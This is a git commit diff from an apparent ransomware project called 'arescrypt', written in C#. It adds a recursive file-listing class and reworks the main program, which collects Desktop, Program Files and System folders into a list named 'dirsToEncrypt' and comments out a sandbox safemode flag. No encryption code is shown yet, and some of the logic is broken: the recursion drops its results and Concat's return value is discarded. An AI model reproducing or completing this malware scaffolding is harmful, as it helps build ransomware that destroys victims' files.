06d6243b872cd2b16861cc465e0a172941602897
Wįłłý Fœx <BlackVikingPro@users.noreply.github.com>
2017-11-08 12:11:56 -0600

    added FileHandler class, fixed main code

---
+++ arescrypt/FileHandler.cs
@@ -0,0 +1,34 @@
+﻿using System;
+using System.IO;
+using System.Collections.Generic;
+using System.Security.AccessControl;
+using System.Security.Principal;
+
+namespace arescrypt
+{
+    class FileHandler
+    {
+        public static string sessionDomain = Environment.UserDomainName; // get current sessions domain
+        public static string sessionUsername = Environment.UserName; // get current sessions username
+
+        // Recursivly list files in a given directory
+        public static List<string> DirSearch(string sDir)
+        {
+            var fileIndex = new List<string> { };
+            try
+            {
+                foreach (string dir in Directory.GetDirectories(sDir))
+                {
+                    foreach (string file in Directory.GetFiles(dir))
+                        fileIndex.Add(file);
+                    // Search subdirectories
+                    DirSearch(dir);
+                }
+            }
+            catch (Exception)
+            { }
+
+            return fileIndex;
+        }
+    }
+}
--- arescrypt/Program.cs
+++ arescrypt/Program.cs
@@ -1,21 +1,19 @@
 ﻿using System;
 using System.Linq;
+using System.Collections.Generic;
 
 namespace arescrypt
 {
     class Program
     {
-        // DeadPatch was here!
-        static string sessionDomain = Environment.UserDomainName; // get current sessions domain
-        static string sessionUsername = Environment.UserName; // get current sessions username
-        static bool sandBox = true; // Safemode for testing/debugging
+        // static bool sandBox = true; // Safemode for testing/debugging
 
         static void Main(string[] args)
         {
-            Console.WriteLine("Hello, " + sessionUsername);
+            Console.WriteLine("Hello, " + FileHandler.sessionUsername);
 
-            var userSpecificDirs = new System.Collections.Generic.List<string> { };
-            var systemSpecificDirs = new System.Collections.Generic.List<string> { };
+            var userSpecificDirs = new List<string> { };
+            var systemSpecificDirs = new List<string> { };
 
             // User specific directories, administrative rights shouldn't be required in order to write to these files
             userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
@@ -29,40 +27,15 @@ namespace arescrypt
             systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
             systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));
 
-            var directoriesToEncrypt = userSpecificDirs.Concat(systemSpecificDirs);
-            var filesToEncrypt = new System.Collections.Generic.List<string> { };
-            foreach (string directory in directoriesToEncrypt.Distinct().ToList())
+            var dirsToEncrypt = new List<string> { }; // Initialize 'filesToEncrypt' to null
+            dirsToEncrypt.Concat(userSpecificDirs);
+            dirsToEncrypt.Concat(systemSpecificDirs);
+
+            string filesBeforeSplit = default(string);
+            foreach (string dir in userSpecificDirs) // dirsToEncrypt.Distinct().ToList())
             {
-                try
-                {
-                    string[] files = System.IO.Directory.GetFiles(directory, "*.*", System.IO.SearchOption.AllDirectories);
-                    foreach (string file in files)
-                    {
-                        string NtAccountName = sessionDomain + @"\" + sessionUsername;
-                        System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(file);
-                        System.Security.AccessControl.DirectorySecurity acl = di.GetAccessControl(System.Security.AccessControl.AccessControlSections.All);
-                        System.Security.AccessControl.AuthorizationRuleCollection rules = acl.GetAccessRules(true, true, typeof(System.Security.Principal.NTAccount));
-
-                        //Go through the rules returned from the DirectorySecurity
-                        foreach (System.Security.AccessControl.AuthorizationRule rule in rules)
-                        {
-                            //If we find one that matches the identity we are looking for
-                            if (rule.IdentityReference.Value.Equals(NtAccountName, StringComparison.CurrentCultureIgnoreCase))
-                            {
-                                //Cast to a FileSystemAccessRule to check for access rights
-                                if ((((System.Security.AccessControl.FileSystemAccessRule)rule).FileSystemRights & System.Security.AccessControl.FileSystemRights.WriteData) > 0)
-                                    filesToEncrypt.Add(file); // Application has access to the file we want to write to.
-                                else
-                                    filesToEncrypt.Add(file); // Application has access to the file we want to write to.
-                            }
-                        }
-                    }
-                } catch (UnauthorizedAccessException)
-                { Console.WriteLine("Unable to access: " + directory); }
+                FileHandler.DirSearch(dir); // returns List<string>
             }
-
-            foreach (string file in filesToEncrypt)
-                Console.WriteLine(file);
 
             Console.Write("\nPress any key to continue . . . ");
             Console.ReadKey(); // Hang the console
